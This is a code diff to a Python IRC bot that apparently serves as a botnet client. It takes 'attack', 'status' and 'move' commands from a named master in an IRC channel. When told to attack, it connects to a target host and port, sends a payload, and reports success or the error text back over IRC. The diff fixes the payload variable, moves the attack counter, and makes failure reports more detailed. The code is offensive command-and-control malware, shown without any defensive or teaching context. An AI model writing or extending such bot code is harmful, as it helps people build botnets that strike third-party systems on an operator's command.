@@ -69,12 +69,11 @@ def attack(masterName, hostname,port):
     try:
         s.connect((hostname,int(port)))
         attack = botname+str(atkCounter)
-        s.send(req.encode())
-        atkCounter += 1
+        s.send(attack.encode())
         msg = "PRIVMSG "+masterName+" :success\r\n"
         irc.send(msg.encode())
     except Exception as err:
-        msg = "PRIVMSG "+masterName+" :fail\r\n"
+        msg = "PRIVMSG "+masterName+" :fail, "+str(err)+"\r\n"
         irc.send(msg.encode())
         print(err)
     return
@@ -83,6 +82,7 @@ def move(masterName,hostname,port,channel):
     return
 # use the listen to chat
 def listen():
+    global atkCounter
     while True:
         indata = irc.recv(1024)
         inmsg = indata.decode("utf-8").split()
@@ -100,6 +100,8 @@ def listen():
                 print ("serving master!")
                 if inCmd == 'attack':
                     attack(masterName,inmsg[5],int(inmsg[6]))
+                    atkCounter += 1
+                    print(atkCounter)
                 elif inCmd == 'status':
                     status(masterName)
                 elif inCmd == 'move':
